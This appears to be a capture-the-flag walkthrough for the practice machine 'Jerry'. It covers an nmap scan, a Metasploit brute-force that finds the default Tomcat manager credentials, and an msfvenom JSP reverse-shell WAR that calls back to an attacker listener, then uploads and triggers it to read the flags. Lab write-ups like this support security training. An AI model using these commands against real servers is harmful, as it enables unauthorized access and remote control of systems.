# Jerry

## NMAP scan

### Scan command

```sh
nmap -A -T5 -p-  10.10.10.95
```

### Result
```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-09 05:50 EDT
Nmap scan report for 10.10.10.95
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   199.09 ms 10.10.14.1
2   199.91 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.25 seconds
```

## Result analysis

From the NMAP scan, we see that the port 8080 is open and is a tomcat server. So for our attack strategy, we can use the following:

1. Attack the tomcat server with any version exploits
2. Brute-force admin site password

### Checking out the tomcat server

Upon first inspection after loading the tomcat manager into a browser, we see that it is still
an unconfigured server. This presents a likely answer that the server is not even set up yet.

### Metasploit

Using metasploit to crack the credentials

```sh
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 10.10.10.95
exploit
```

and the username and password is given as username: `tomcat`, password: `s3cret`

### Exploitation

After logging onto the webpage, we see that it is possible to get a reverse shell by a `war` file.
Let's create a payload from MSFVenom to make a reverse shell

### MSFVenom

```sh
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.14 LPORT=8888 -f war > shell.war
```

Now upload the war file to the tomcat server

### Reverse shell

```sh
msfconsole
use exploit/multi/handler
set payload java/jsp_shell_reverse_tcp
set lhost 10.10.14.14
set lport 8888
```

and now nagivate to `10.10.10.95:8080/shell` to run the shell payload.
and this gives us what we want! A reverse shell.

Navigating to the desktop of administrator

```sh
type "2 for the price of 1.txt"
```

and both the flags appear